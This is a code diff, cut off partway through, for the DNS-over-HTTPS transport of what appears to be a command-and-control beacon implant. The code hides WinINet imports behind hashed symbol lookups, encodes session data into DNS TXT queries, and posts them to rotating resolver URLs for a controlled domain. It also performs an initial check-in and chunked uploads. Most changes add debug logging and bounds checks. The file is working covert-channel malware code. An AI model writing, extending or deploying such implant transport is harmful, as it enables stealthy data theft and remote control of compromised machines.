@@ -70,30 +70,52 @@ static void BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, co
 		_snprintf(out, outSize, "%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart);
 }
 
+// Forward declaration so helpers can log before DohConnectorLog definition
+static void DohConnectorLog(const char* msg);
+
 static int EncodeDnsName(const CHAR* host, BYTE* buf, int bufSize)
 {
+	if (!host || !buf || bufSize <= 1)
+		return -1;
+
+	CHAR dbg[160];
+	_snprintf(dbg, sizeof(dbg), "[DoH] EncodeDnsName enter, bufSize=%d", bufSize);
+	DohConnectorLog(dbg);
+	DohConnectorLog(host);
+
 	int len = 0;
 	const CHAR* p = host;
-	while (*p && len < bufSize - 1) {
+	while (*p) {
+		// 计算当前 label 长度
 		const CHAR* labelStart = p;
 		int labelLen = 0;
-		while (*p && *p != '.' && len + 1 + labelLen < bufSize - 1) {
+		while (*p && *p != '.') {
 			++p;
 			++labelLen;
 		}
 		if (labelLen == 0)
 			break;
-		buf[len++] = (BYTE)labelLen;
-		if (len + labelLen >= bufSize)
+		if (labelLen > 63)
+			labelLen = 63; // 单个 label 最长 63 字节
+
+		// 检查: 1 字节长度 + labelLen + 终止 0 至少还要 1 字节
+		if (len + 1 + labelLen + 1 > bufSize)
 			return -1;
+
+		buf[len++] = (BYTE)labelLen;
 		memcpy(buf + len, labelStart, labelLen);
 		len += labelLen;
+
 		if (*p == '.')
 			++p;
 	}
-	if (len >= bufSize)
+	// 加终止 0
+	if (len + 1 > bufSize)
 		return -1;
 	buf[len++] = 0;
+
+	_snprintf(dbg, sizeof(dbg), "[DoH] EncodeDnsName leave, len=%d", len);
+	DohConnectorLog(dbg);
 	return len;
 }
 
@@ -167,35 +189,56 @@ static int Base64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax)
 // ConnectorDoH Implementation
 // -----------------------------------------------------------------------------
 
-// Internal debug logger for DoH connector. Writes short markers into
-// C:\\Windows\\Temp\\ax_doh_beacon.log using Kernel32 APIs from ApiWin.
 static void DohConnectorLog(const char* msg)
 {
-    if (!ApiWin || !ApiWin->CreateFileA || !ApiWin->WriteFile)
-        return;
+	if (!msg) return;
 
-    CHAR path[] = "C:\\Windows\\Temp\\ax_doh_beacon.log";
-    HANDLE hFile = ApiWin->CreateFileA(path,
-        FILE_APPEND_DATA,
-        FILE_SHARE_READ,
-        NULL,
-        OPEN_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-        return;
+	CHAR path[MAX_PATH] = {0};
+	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+	if (len == 0 || len >= MAX_PATH)
+		return;
 
-    DWORD written = 0;
-    SIZE_T len = StrLenA((CHAR*)msg);
-    if (len)
-        ApiWin->WriteFile(hFile, msg, (DWORD)len, &written, NULL);
-    CHAR crlf[] = "\r\n";
-    ApiWin->WriteFile(hFile, crlf, 2, &written, NULL);
+	for (int i = (int)len - 1; i >= 0; --i) {
+		if (path[i] == '\\' || path[i] == '/') {
+			path[i + 1] = '\0';
+			break;
+		}
+	}
+	const CHAR logName[] = "ax_doh_beacon.log";
+	SIZE_T dirLen = lstrlenA(path);
+	if (dirLen + sizeof(logName) >= MAX_PATH)
+		return;
+	lstrcatA(path, logName);
+
+	HANDLE hFile = CreateFileA(path,
+		FILE_APPEND_DATA,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
+		return;
+
+	DWORD written = 0;
+	SIZE_T mlen = lstrlenA(msg);
+	if (mlen)
+		WriteFile(hFile, msg, (DWORD)mlen, &written, NULL);
+	CHAR crlf[] = "\r\n";
+	WriteFile(hFile, crlf, 2, &written, NULL);
+	CloseHandle(hFile);
 }
 
 ConnectorDoH::ConnectorDoH()
 {
+	DohConnectorLog("[DoH] Ctor: start");
+
     this->functions = (DOH_HTTP_FUNC*) ApiWin->LocalAlloc(LPTR, sizeof(DOH_HTTP_FUNC) );
+    if (!this->functions) {
+        DohConnectorLog("[DoH] Ctor: LocalAlloc for DOH_HTTP_FUNC failed");
+        return;
+    }
+    DohConnectorLog("[DoH] Ctor: LocalAlloc OK");
     
     this->functions->LocalAlloc   = ApiWin->LocalAlloc;
     this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
@@ -203,29 +246,51 @@ ConnectorDoH::ConnectorDoH()
     this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
     this->functions->GetLastError = ApiWin->GetLastError;
 
-    CHAR wininet_c[] = { 'w','i','n','i','n','e','t','.','d','l','l',0 };
-    HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
-    if (hWininetModule) {
-        this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
-        this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
-        this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
-        this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
-        this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
-        this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
-        this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
-        this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
-        this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
-        this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
+    HMODULE hWininetModule = this->functions->LoadLibraryA("wininet.dll" );
+    if (!hWininetModule) {
+        DohConnectorLog("[DoH] Ctor: LoadLibraryA(wininet.dll) failed");
+        return;
+    }
+    DohConnectorLog("[DoH] Ctor: wininet.dll loaded");
+
+    	if ( hWininetModule )
+	{
+		this->functions->InternetOpenA           = (decltype(InternetOpenA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
+		this->functions->InternetConnectA        = (decltype(InternetConnectA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
+		this->functions->HttpOpenRequestA        = (decltype(HttpOpenRequestA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
+		this->functions->HttpSendRequestA        = (decltype(HttpSendRequestA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
+		this->functions->InternetSetOptionA      = (decltype(InternetSetOptionA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
+		this->functions->InternetQueryOptionA    = (decltype(InternetQueryOptionA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
+		this->functions->HttpQueryInfoA          = (decltype(HttpQueryInfoA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
+		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
+		this->functions->InternetCloseHandle     = (decltype(InternetCloseHandle)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
+		this->functions->InternetReadFile        = (decltype(InternetReadFile)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
+
+		if ( !this->functions->InternetOpenA || !this->functions->InternetConnectA || !this->functions->HttpOpenRequestA || !this->functions->HttpSendRequestA || !this->functions->InternetReadFile )
+		{
+			DohConnectorLog("[DoH] Ctor: WinINet symbols missing");
+		}
+		else {
+			DohConnectorLog("[DoH] Ctor: WinINet symbols resolved");
+			CHAR dbg[256];
+			_snprintf(dbg, sizeof(dbg),
+				"[DoH] Ctor: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
+				this,
+				this->functions,
+				this->functions->LocalAlloc,
+				this->functions->InternetOpenA,
+				this->functions->InternetConnectA,
+				this->functions->HttpOpenRequestA,
+				this->functions->HttpSendRequestA,
+				this->functions->InternetReadFile);
+			DohConnectorLog(dbg);
+		}
+
     }
 }
 
 ConnectorDoH::~ConnectorDoH()
 {
-    CloseConnector();
-    if (this->functions) {
-        ApiWin->LocalFree(this->functions);
-        this->functions = NULL;
-    }
 }
 
 BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
@@ -238,10 +303,11 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
 
     this->profile = profile;
 
+    // encrypt_key is a 16-byte RC4 session key, not a null-terminated string.
+    // Always copy the full 16 bytes instead of using StrLenA, which may walk
+    // past the buffer or stop early on random zeros.
     if (profile.encrypt_key) {
-        ULONG keyLen = StrLenA((CHAR*)profile.encrypt_key);
-        if (keyLen > 16) keyLen = 16;
-        memcpy(this->encryptKey, profile.encrypt_key, keyLen);
+        memcpy(this->encryptKey, profile.encrypt_key, 16);
     }
 
     this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
@@ -325,9 +391,23 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
         }
     }
 
-    this->initialized = TRUE;
-    DohConnectorLog("[DoH] SetConfig: OK (initialized)");
-    return TRUE;
+	this->initialized = TRUE;
+	{
+		CHAR dbg[256];
+		_snprintf(dbg, sizeof(dbg),
+			"[DoH] SetConfig: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
+			this,
+			this->functions,
+			this->functions ? this->functions->LocalAlloc : NULL,
+			this->functions ? this->functions->InternetOpenA : NULL,
+			this->functions ? this->functions->InternetConnectA : NULL,
+			this->functions ? this->functions->HttpOpenRequestA : NULL,
+			this->functions ? this->functions->HttpSendRequestA : NULL,
+			this->functions ? this->functions->InternetReadFile : NULL);
+		DohConnectorLog(dbg);
+	}
+	DohConnectorLog("[DoH] SetConfig: OK (initialized)");
+	return TRUE;
 }
 
 void ConnectorDoH::CloseConnector()
@@ -366,11 +446,56 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
     *outData = NULL;
     *outLen = 0;
 
-    if (!this->functions || !this->functions->InternetOpenA) return FALSE;
+	if (!this->functions) {
+		DohConnectorLog("[DoH] HTTP: functions == NULL");
+		return FALSE;
+	}
+	if (!this->functions->LocalAlloc ||
+		!this->functions->InternetOpenA ||
+		!this->functions->InternetConnectA ||
+		!this->functions->HttpOpenRequestA ||
+		!this->functions->HttpSendRequestA ||
+		!this->functions->InternetReadFile) {
+		DohConnectorLog("[DoH] HTTP: critical WinINet pointers missing");
+		CHAR dbg[256];
+		_snprintf(dbg, sizeof(dbg),
+			"[DoH] HTTP: funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
+			this->functions,
+			this->functions->LocalAlloc,
+			this->functions->InternetOpenA,
+			this->functions->InternetConnectA,
+			this->functions->HttpOpenRequestA,
+			this->functions->HttpSendRequestA,
+			this->functions->InternetReadFile);
+		DohConnectorLog(dbg);
+		return FALSE;
+	}
+
+	DohConnectorLog("[DoH] HTTP: PerformHttpRequest enter");
+	{
+		CHAR dbg[256];
+		_snprintf(dbg, sizeof(dbg),
+			"[DoH] HTTP: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
+			this,
+			this->functions,
+			this->functions->LocalAlloc,
+			this->functions->InternetOpenA,
+			this->functions->InternetConnectA,
+			this->functions->HttpOpenRequestA,
+			this->functions->HttpSendRequestA,
+			this->functions->InternetReadFile);
+		DohConnectorLog(dbg);
+	}
+	if (qname) DohConnectorLog(qname);
 
     // 1. Construct DNS Wire Format Query
-    BYTE query[4096];
-    memset(query, 0, sizeof(query));
+    const int kDnsQueryMax = 4096;
+    BYTE* query = (BYTE*)this->functions->LocalAlloc(LPTR, kDnsQueryMax);
+    if (!query) {
+        DohConnectorLog("[DoH] HTTP: LocalAlloc failed for DNS query buffer");
+        return FALSE;
+    }
+
     USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
     query[0] = (BYTE)(id >> 8);
     query[1] = (BYTE)(id & 0xFF);
@@ -378,10 +503,29 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
     query[5] = 0x01; // QDCOUNT = 1
 
     int offset = 12;
-    int nameLen = EncodeDnsName(qname, query + offset, sizeof(query) - offset - 4);
-    if (nameLen < 0) return FALSE;
+    // 留出至少 4 字节给 QTYPE/QCLASS
+    if (offset >= kDnsQueryMax - 4) {
+        this->functions->LocalFree(query);
+        return FALSE;
+    }
+
+    int nameLen = EncodeDnsName(qname, query + offset, kDnsQueryMax - offset - 4);
+    if (nameLen < 0) {
+        this->functions->LocalFree(query);
+        return FALSE;
+    }
     offset += nameLen;
-    
+	{
+		CHAR dbg[96];
+		_snprintf(dbg, sizeof(dbg), "[DoH] HTTP: nameLen=%d offset=%d", nameLen, offset);
+		DohConnectorLog(dbg);
+	}
+
+    // 确保还有空间写入 QTYPE/QCLASS
+    if (offset + 4 > kDnsQueryMax) {
+        this->functions->LocalFree(query);
+        return FALSE;
+    }
     query[offset++] = 0x00; query[offset++] = 0x10; // TXT
     query[offset++] = 0x00; query[offset++] = 0x01; // IN
 
@@ -394,32 +538,47 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
     // TTL: 0 (Ext RCODE, Version, Flags)
     // RdLen: 0
     // -------------------------------------------------------------------------
-    if (offset + 11 < sizeof(query)) {
+    // 需要 11 个字节空间写 OPT RR
+    if (offset + 11 <= kDnsQueryMax) {
         query[offset++] = 0x00;             // Name (.)
         query[offset++] = 0x00; query[offset++] = 0x29; // Type 41
         query[offset++] = 0x10; query[offset++] = 0x00; // Class: 4096
         query[offset++] = 0x00; query[offset++] = 0x00; // TTL
         query[offset++] = 0x00; query[offset++] = 0x00; 
         query[offset++] = 0x00; query[offset++] = 0x00; // RdLen: 0
-        
+
         // Update ARCOUNT in Header (Bytes 10, 11)
         query[11] = 0x01; 
     }
 
     if (!this->hInternet) {
+        DohConnectorLog("[DoH] HTTP: InternetOpenA start");
         this->hInternet = this->functions->InternetOpenA(
             (CHAR*)(this->profile.user_agent ? this->profile.user_agent : "Mozilla/5.0"), 
             INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (!this->hInternet) {
+            DohConnectorLog("[DoH] HTTP: InternetOpenA failed");
+        } else {
+            DohConnectorLog("[DoH] HTTP: InternetOpenA OK");
+        }
     }
-    if (!this->hInternet) return FALSE;
+    if (!this->hInternet) {
+        this->functions->LocalFree(query);
+        return FALSE;
+    }
 
-    if (this->urlCount == 0) return FALSE;
+    if (this->urlCount == 0) {
+        this->functions->LocalFree(query);
+        return FALSE;
+    }
 
     // Rotation Loop
     for (ULONG i = 0; i < this->urlCount; ++i) {
         ULONG idx = (this->currentUrlIndex + i) % this->urlCount;
         CHAR* targetUrl = this->urlList[idx];
         if (!targetUrl || !*targetUrl) continue;
+		DohConnectorLog("[DoH] HTTP: using URL");
+		DohConnectorLog(targetUrl);
 
         CHAR hostName[256] = {0};
         CHAR urlPath[256] = {0};
@@ -460,13 +619,19 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
         }
 
         this->hConnect = this->functions->InternetConnectA(this->hInternet, hostName, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-        if (!this->hConnect) continue;
+        if (!this->hConnect) {
+            DohConnectorLog("[DoH] HTTP: InternetConnectA failed, rotating URL");
+            continue;
+        }
 
         DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES;
         if (isSecure) flags |= INTERNET_FLAG_SECURE;
 
         HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, "POST", urlPath, NULL, NULL, NULL, flags, 0);
-        if (!hRequest) continue;
+        if (!hRequest) {
+            DohConnectorLog("[DoH] HTTP: HttpOpenRequestA failed, rotating URL");
+            continue;
+        }
 
         if (isSecure) {
             DWORD dwFlags;
@@ -497,11 +662,17 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
 
                     do {
                         if (!this->functions->InternetQueryDataAvailable(hRequest, &dwSize, 0, 0)) {
+                            DohConnectorLog("[DoH] HTTP: InternetQueryDataAvailable failed");
                             readSuccess = FALSE; break; 
                         }
                         if (dwSize == 0) break;
                         
                         BYTE* newBuf = (BYTE*)this->functions->LocalAlloc(LPTR, respSize + dwSize);
+                        if (!newBuf) {
+                            DohConnectorLog("[DoH] HTTP: LocalAlloc failed while extending respBuf");
+                            readSuccess = FALSE;
+                            break;
+                        }
                         if (respBuf) {
                             memcpy(newBuf, respBuf, respSize);
                             this->functions->LocalFree(respBuf);
@@ -511,27 +682,35 @@ BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, BYTE** outData, ULONG* 
                         if (this->functions->InternetReadFile(hRequest, respBuf + respSize, dwSize, &dwDownloaded)) {
                             respSize += dwDownloaded;
                         } else {
+                            DohConnectorLog("[DoH] HTTP: InternetReadFile failed");
                             readSuccess = FALSE; break;
                         }
                     } while (dwSize > 0);
 
                     if (readSuccess && respBuf && respSize > 0) {
+                        CHAR dbg[96];
+                        _snprintf(dbg, sizeof(dbg), "[DoH] HTTP: respSize=%lu", (unsigned long)respSize);
+                        DohConnectorLog(dbg);
                         // Success! Update current index
                         this->currentUrlIndex = idx;
                         *outData = respBuf;
                         *outLen = respSize;
                         this->functions->InternetCloseHandle(hRequest);
+                        this->functions->LocalFree(query);
                         return TRUE;
                     }
                     
                     if (respBuf) this->functions->LocalFree(respBuf);
+                } else {
+                    DohConnectorLog("[DoH] HTTP: statusCode != 200");
                 }
             }
         }
-        
+
         this->functions->InternetCloseHandle(hRequest);
     }
 
+    this->functions->LocalFree(query);
     return FALSE;
 }
 
@@ -541,11 +720,22 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
     BYTE* respData = NULL;
     ULONG respLen = 0;
 
-    if (!PerformHttpRequest(qname, &respData, &respLen))
-        return FALSE;
+	DohConnectorLog("[DoH] DohQueryTxt enter");
+	if (qname) DohConnectorLog(qname);
 
-    // Parse DNS Response
+    if (!PerformHttpRequest(qname, &respData, &respLen)) {
+        DohConnectorLog("[DoH] DohQueryTxt: PerformHttpRequest FAILED");
+        return FALSE;
+    }
+	{
+		CHAR dbg[96];
+		_snprintf(dbg, sizeof(dbg), "[DoH] DohQueryTxt: respLen=%lu", (unsigned long)respLen);
+		DohConnectorLog(dbg);
+	}
+
+    // Safe parsing of DNS response
     if (respLen < 12) {
+        DohConnectorLog("[DoH] DohQueryTxt: respLen too small for header");
         this->functions->LocalFree(respData);
         return FALSE;
     }
@@ -553,69 +743,103 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
     BYTE* resp = respData;
     int qdcount = (resp[4] << 8) | resp[5];
     int ancount = (resp[6] << 8) | resp[7];
+    int maxLen = (int)respLen;
     int pos = 12;
 
-    // Skip questions
+    // Skip question section safely
     for (int qi = 0; qi < qdcount; ++qi) {
-        while (pos < (int)respLen && resp[pos] != 0) {
-            if ((resp[pos] & 0xC0) == 0xC0) {
+        // Skip QNAME
+        while (pos < maxLen) {
+            BYTE lab = resp[pos];
+            if ((lab & 0xC0) == 0xC0) {
+                // compression pointer
+                if (pos + 1 >= maxLen) {
+                    DohConnectorLog("[DoH] DohQueryTxt: question name ptr truncated");
+                    this->functions->LocalFree(respData);
+                    return FALSE;
+                }
                 pos += 2;
                 break;
             }
-            pos += resp[pos] + 1;
+            if (lab == 0) {
+                pos++;
+                break;
+            }
+            // label length + content
+            if (pos + 1 + lab > maxLen) {
+                DohConnectorLog("[DoH] DohQueryTxt: question label exceeds buffer");
+                this->functions->LocalFree(respData);
+                return FALSE;
+            }
+            pos += 1 + lab;
         }
-        // Skip null label terminator
-        if (pos < (int)respLen && resp[pos] == 0) pos++;
-        // Skip QTYPE(2) + QCLASS(2)
+        // Skip QTYPE + QCLASS
+        if (pos + 4 > maxLen) {
+            DohConnectorLog("[DoH] DohQueryTxt: question tail truncated");
+            this->functions->LocalFree(respData);
+            return FALSE;
+        }
         pos += 4;
     }
 
     BOOL found = FALSE;
-    for (int ai = 0; ai < ancount && pos + 10 <= (int)respLen; ++ai) {
-        // Skip answer name (handle compression)
-        if ((resp[pos] & 0xC0) == 0xC0) {
-            pos += 2;
-        } else {
-            while (pos < (int)respLen && resp[pos] != 0) {
-                if ((resp[pos] & 0xC0) == 0xC0) {
-                    pos += 2;
-                    break;
+    for (int ai = 0; ai < ancount; ++ai) {
+        if (pos >= maxLen) break;
+
+        // Skip answer name
+        while (pos < maxLen) {
+            BYTE lab = resp[pos];
+            if ((lab & 0xC0) == 0xC0) {
+                if (pos + 1 >= maxLen) {
+                    DohConnectorLog("[DoH] DohQueryTxt: answer name ptr truncated");
+                    this->functions->LocalFree(respData);
+                    return FALSE;
                 }
-                pos += resp[pos] + 1;
+                pos += 2;
+                break;
             }
-            if (pos < (int)respLen && resp[pos] == 0) pos++;
+            if (lab == 0) {
+                pos++;
+                break;
+            }
+            if (pos + 1 + lab > maxLen) {
+                DohConnectorLog("[DoH] DohQueryTxt: answer label exceeds buffer");
+                this->functions->LocalFree(respData);
+                return FALSE;
+            }
+            pos += 1 + lab;
         }
 
-        if (pos + 10 > (int)respLen) break;
+        // Need TYPE(2)+CLASS(2)+TTL(4)+RDLEN(2)
+        if (pos + 10 > maxLen) break;
         USHORT type = (resp[pos] << 8) | resp[pos + 1];
-        // USHORT cls = (resp[pos + 2] << 8) | resp[pos + 3];
-        // UINT32 ttl = ((UINT32)resp[pos + 4] << 24) | ((UINT32)resp[pos + 5] << 16) | ((UINT32)resp[pos + 6] << 8) | (UINT32)resp[pos + 7];
         USHORT rdlen = (resp[pos + 8] << 8) | resp[pos + 9];
         pos += 10;
-        if (pos + rdlen > (int)respLen) break;
+        if (pos + rdlen > maxLen) {
+            DohConnectorLog("[DoH] DohQueryTxt: RDLEN exceeds buffer");
+            break;
+        }
 
         if (type == 16) { // TXT
-            // TXT RDATA can contain multiple character-strings, each prefixed
-            // with a length byte. Server-side may split long Base64 into
-            // multiple <=255-char chunks, so concatenate all strings here.
             USHORT consumed = 0;
             ULONG written = 0;
-            while (consumed < rdlen && written < outBufSize) {
-                if (pos + consumed >= (int)respLen) break;
+            while (consumed < rdlen) {
+                if (pos + consumed >= maxLen) break;
                 BYTE txtLen = resp[pos + consumed];
                 consumed++;
-                if (txtLen == 0) continue;
                 if (consumed + txtLen > rdlen) {
-                    // Truncated / invalid, clamp to remaining
-                    txtLen = (BYTE)(rdlen - consumed);
+                    // malformed inner length, stop
+                    break;
                 }
-                ULONG copyLen = txtLen;
-                if (written + copyLen > outBufSize) {
-                    copyLen = (BYTE)(outBufSize - written);
+                if (txtLen > 0) {
+                    if (written + txtLen <= outBufSize) {
+                        memcpy(outBuf + written, resp + pos + consumed, txtLen);
+                        written += txtLen;
+                    } else {
+                        // output buffer full
+                        break;
+                    }
                 }
-                if (copyLen == 0) break;
-                memcpy(outBuf + written, resp + pos + consumed, copyLen);
-                written += copyLen;
                 consumed += txtLen;
             }
             if (written > 0) {
@@ -624,6 +848,7 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
                 break;
             }
         }
+
         pos += rdlen;
     }
 
@@ -631,230 +856,312 @@ BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize
     return found;
 }
 
-// SendData / Receive Logic (Identical structure to ConnectorDNS)
+// SendData / Receive Logic (HI + upload + downlink reassembly)
 // -----------------------------------------------------------------------------
 
 void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 {
-    ULONG pkt = this->pktSize ? this->pktSize : 1024;
-    if (pkt > 64000) pkt = 64000;
+	DohConnectorLog("[DoH] SendData: enter");
+	{
+		CHAR dbg[256];
+		_snprintf(dbg, sizeof(dbg),
+			"[DoH] SendData: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
+			this,
+			this->functions,
+			this->functions ? this->functions->LocalAlloc : NULL,
+			this->functions ? this->functions->InternetOpenA : NULL,
+			this->functions ? this->functions->InternetConnectA : NULL,
+			this->functions ? this->functions->HttpOpenRequestA : NULL,
+			this->functions ? this->functions->HttpSendRequestA : NULL,
+			this->functions ? this->functions->InternetReadFile : NULL);
+		DohConnectorLog(dbg);
+	}
 
-    CHAR dataLabel[1024];
-    CHAR qname[512];
+	// Base packet size used for logical DNS frames over DoH
+	ULONG pkt = this->pktSize ? this->pktSize : 1024;
+	if (pkt > 64000)
+		pkt = 64000;
 
-    // 1. HI Phase
-    if (!this->hiSent && data && data_size) {
-        const ULONG maxSafeFrame = 60;
-        ULONG maxBuf = pkt;
-        if (maxBuf > maxSafeFrame) maxBuf = maxSafeFrame;
-        if (data_size && maxBuf > data_size) maxBuf = data_size;
+	CHAR dataLabel[1024] = { 0 };
+	CHAR qname[512] = { 0 };
 
-        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
-        memcpy(encBuf, data, maxBuf);
-        // Align with server-side HI handling: server applies RC4 decrypt on the
-        // payload, so we must RC4-encrypt the HI beat here before Base32/QNAME.
-        EncryptRC4(encBuf, maxBuf, this->encryptKey, 16);
-        if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
-            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
-            return;
-        }
-        MemFreeLocal((LPVOID*)&encBuf, maxBuf);
+	// -------------------------------------------------------------------------
+	// 1. HI Phase: first call with non-empty data sends a small beat
+	// -------------------------------------------------------------------------
+	if (!this->hiSent && data && data_size) {
+		DohConnectorLog("[DoH] SendData: HI phase start");
+		// 60 bytes raw -> 96 chars Base32. With prefix + domain this keeps
+		// QNAME well under the 253-byte DNS limit.
+		const ULONG maxSafeFrame = 60;
+		ULONG maxBuf = pkt;
+		if (maxBuf > maxSafeFrame)
+			maxBuf = maxSafeFrame;
+		if (data_size && maxBuf > data_size)
+			maxBuf = data_size;
+		{
+			CHAR dbg[128];
+			_snprintf(dbg, sizeof(dbg), "[DoH] HI: pkt=%lu data=%lu maxBuf=%lu", (unsigned long)pkt, (unsigned long)data_size, (unsigned long)maxBuf);
+			DohConnectorLog(dbg);
+		}
+		if (maxBuf == 0) {
+			DohConnectorLog("[DoH] SendData: HI maxBuf == 0, skipping HI");
+			this->hiSent = TRUE; // avoid looping forever
+		}
+		else {
+			BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
+			if (!encBuf)
+				return;
+			memcpy(encBuf, data, maxBuf);
+			memset(dataLabel, 0, sizeof(dataLabel));
+			if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
+				MemFreeLocal((LPVOID*)&encBuf, maxBuf);
+				return;
+			}
+			MemFreeLocal((LPVOID*)&encBuf, maxBuf);
 
-        BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
-        
-        BYTE tmp[512];
-        ULONG tmpSize = 0;
-        if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
-            this->hiSent = TRUE;
-        } else if (this->hiRetries > 0) {
-            this->hiRetries--;
-        }
-        return;
-    }
+			// Cache original HI beat for smart retries
+			this->hiBeatSize = maxBuf;
+			if (!this->hiBeat) {
+				this->hiBeat = (BYTE*)MemAllocLocal(this->hiBeatSize);
+				if (this->hiBeat)
+					memcpy(this->hiBeat, data, this->hiBeatSize);
+			}
 
-    // 2. Data Upload (PUT)
-    if (data && data_size) {
-        const ULONG headerSize = 8;
-        ULONG total = data_size;
-        ULONG maxChunk = pkt;
-        if (maxChunk <= headerSize) maxChunk = headerSize + 1;
-        maxChunk -= headerSize;
+			BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+			BYTE tmp[512];
+			ULONG tmpSize = 0;
+			if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
+				this->hiSent = TRUE;
+			}
+			else if (this->hiRetries > 0) {
+				this->hiRetries--;
+			}
+		}
+		return;
+	}
 
-        const ULONG maxSafeFrame = 120;
-        if (maxChunk + headerSize > maxSafeFrame) maxChunk = maxSafeFrame - headerSize;
+	// -------------------------------------------------------------------------
+	// 2. Upload path: data present => PUT-like behavior with framing
+	//    frame = [4 bytes total_len][4 bytes offset][chunk...]
+	// -------------------------------------------------------------------------
+	if (data && data_size) {
+		const ULONG headerSize = 8;
+		ULONG total = data_size;
+		ULONG maxChunk = pkt;
+		if (maxChunk <= headerSize)
+			maxChunk = headerSize + 1;
+		maxChunk -= headerSize;
 
